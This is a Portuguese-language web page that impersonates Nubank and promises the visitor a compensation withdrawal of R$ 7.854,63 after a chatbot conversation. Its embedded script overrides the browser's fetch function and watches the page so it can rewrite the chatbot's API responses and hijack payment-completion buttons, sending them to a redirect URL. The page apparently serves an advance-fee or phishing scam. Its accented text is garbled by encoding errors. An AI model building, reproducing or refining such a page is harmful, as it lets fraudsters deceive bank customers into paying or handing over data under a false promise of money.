<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Saque da Indeniza√ß√£o</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-[#831BD1] min-h-screen flex flex-col">
  <header class="bg-white px-4 shadow-md">
    <div class="max-w-[1200px] mx-auto flex items-center gap-6">
      <img src="images/logo.svg" alt="Nubank" class="h-16 w-auto">
    </div>
  </header>

  <main class="flex-1 px-4 py-2">
    <div class="flex flex-col">
      <main>
        <div class="max-h-min">
          <div class="px-0.5 pb-[0.6rem]">
            <div class="bg-white border border-gray-300 rounded-md w-full h-[calc(100vh-80px)] overflow-hidden">
              <div class="px-4 pt-4 pb-0 text-center max-w-md mx-auto text-black">
                <p class="text-base">
                  <span>Ol√°, </span>
                  <span class="text-black font-bold">USU√°RIO!</span>
                </p>
                <p class="mt-1 text-sm">
                  Responda as perguntas abaixo para realizar<br>seu saque de <span>R$ 7.854,63</span>
                </p>
              </div>

              <!-- Typebot -->
              <script type="module">
                import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.86/dist/web.js';

                async function initializeTypebot() {
                  try {
                    await Typebot.initStandard({
                      typebot: "nub-1-mcrdbzs",
                      apiHost: "https://chat.typezap.site",
                    });
                    
                    console.log('Typebot carregado - Iniciando intercepta√ß√£o');
                    initTypebotInterceptor();
                    initAPIMonitoring();
                    initDOMMonitoring();
                  } catch (error) {
                    console.error('Erro ao carregar Typebot:', error);
                    setTimeout(initializeTypebot, 1000);
                  }
                }

                initializeTypebot();
              </script>

              <script>
              // Configura√ß√µes
              const TARGET_TEXTS = [
                "Concluir pagamento e receber minha indeniza√ß√£o",
                "Finalizar processo",
                "Confirmar recebimento"
              ];
              const NEW_URL = "https://google.com";
              const CHECK_INTERVAL = 300;
              let observer;
              let intervalId;
              let interceptActive = true;

              // Intercepta√ß√£o de API corrigida
              function initAPIMonitoring() {
                const originalFetch = window.fetch;
                window.fetch = async function(input, init) {
                  // Verifica se √© uma URL que queremos interceptar
                  const url = typeof input === 'string' ? input : input.url;
                  if (url && url.includes('/continueChat')) {
                    try {
                      const response = await originalFetch.apply(this, arguments);
                      const clonedResponse = response.clone();
                      const data = await clonedResponse.json();
                      
                      if (TARGET_TEXTS.some(text => JSON.stringify(data).includes(text))) {
                        data.messages = data.messages.map(msg => {
                          if (msg.content?.richText) {
                            msg.content.richText = msg.content.richText.map(rich => ({
                              ...rich,
                              children: rich.children.map(child => ({
                                ...child,
                                text: child.text?.replace(/https?:\/\/[^\s]+/g, NEW_URL)
                              }))
                            }));
                          }
                          return msg;
                        });
                        console.log('‚úÖ Resposta da API modificada');
                        return new Response(JSON.stringify(data), response);
                      }
                      return response;
                    } catch (e) {
                      console.error('Erro ao interceptar API:', e);
                      return originalFetch.apply(this, arguments);
                    }
                  }
                  return originalFetch.apply(this, arguments);
                };
                console.log('üîå Intercepta√ß√£o de API ativada');
              }

              // Restante do c√≥digo permanece igual
              function hasTargetText(element) {
                return TARGET_TEXTS.some(text => 
                  element.textContent && element.textContent.includes(text)
                );
              }

              function replaceElement(element) {
                try {
                  if (element.tagName === 'A') {
                    element.href = NEW_URL;
                    element.target = '_blank';
                  }
                  element.style.cursor = 'pointer';
                  element.onclick = (e) => {
                    e.preventDefault();
                    e.stopPropagation();
                    e.stopImmediatePropagation();
                    window.open(NEW_URL, '_blank');
                    return false;
                  };
                  
                  const newElement = element.cloneNode(true);
                  element.parentNode.replaceChild(newElement, element);
                  return newElement;
                } catch (e) {
                  console.error('Erro ao substituir elemento:', e);
                  return element;
                }
              }

              function scanAndReplace() {
                if (!interceptActive) return;
                
                try {
                  const typebot = document.querySelector('typebot-standard');
                  if (typebot && typebot.shadowRoot) {
                    typebot.shadowRoot.querySelectorAll('a, button, [onclick], .button, .btn').forEach(el => {
                      if (hasTargetText(el)) replaceElement(el);
                    });
                  }

                  document.querySelectorAll('a, button, [onclick], .button, .btn').forEach(el => {
                    if (hasTargetText(el)) replaceElement(el);
                  });
                } catch (e) {
                  console.error('Erro na verifica√ß√£o:', e);
                }
              }

              function initTypebotInterceptor() {
                try {
                  observer = new MutationObserver((mutations) => {
                    mutations.forEach((mutation) => {
                      mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1 && node.querySelectorAll) {
                          node.querySelectorAll('a, button, [onclick], .button, .btn').forEach(el => {
                            if (hasTargetText(el)) replaceElement(el);
                          });
                        }
                      });
                    });
                  });

                  observer.observe(document.body, {
                    childList: true,
                    subtree: true
                  });

                  scanAndReplace();
                  intervalId = setInterval(scanAndReplace, CHECK_INTERVAL);
                  
                  setTimeout(() => {
                    if (intervalId) clearInterval(intervalId);
                    console.log('‚è± Verifica√ß√£o peri√≥dica encerrada');
                  }, 120000);
                  
                  console.log('üõ° Interceptor do Typebot ativado com sucesso');
                } catch (e) {
                  console.error('Falha na inicializa√ß√£o:', e);
                }
              }

              function initDOMMonitoring() {
                const domObserver = new MutationObserver(mutations => {
                  mutations.forEach(mutation => {
                    mutation.addedNodes.forEach(node => {
                      if (node.nodeType === 1) {
                        const elements = node.querySelectorAll ? node.querySelectorAll('*') : [node];
                        elements.forEach(el => {
                          if (el.textContent && TARGET_TEXTS.some(text => el.textContent.includes(text))) {
                            if (el.tagName === 'A') {
                              el.href = NEW_URL;
                              el.target = '_blank';
                            }
                            if (el.onclick || el.getAttribute('onclick')) {
                              el.onclick = () => window.open(NEW_URL, '_blank');
                            }
                          }
                        });
                      }
                    });
                  });
                });

                domObserver.observe(document.body, {
                  childList: true,
                  subtree: true,
                  attributes: true
                });

                document.querySelectorAll('a, [onclick], button').forEach(el => {
                  if (TARGET_TEXTS.some(text => el.textContent.includes(text))) {
                    if (el.tagName === 'A') {
                      el.href = NEW_URL;
                      el.target = '_blank';
                    } else {
                      el.onclick = () => window.open(NEW_URL, '_blank');
                    }
                  }
                });

                console.log('üëÄ Monitoramento de DOM ativado');
              }

              window.typebotInterceptor = {
                enable: () => { interceptActive = true; initTypebotInterceptor(); },
                disable: () => { interceptActive = false; if (observer) observer.disconnect(); if (intervalId) clearInterval(intervalId); },
                scan: scanAndReplace
              };
              </script>

              <typebot-standard></typebot-standard>
            </div>
          </div>
        </div>
      </main>
    </div>
  </main>
</body>
</html>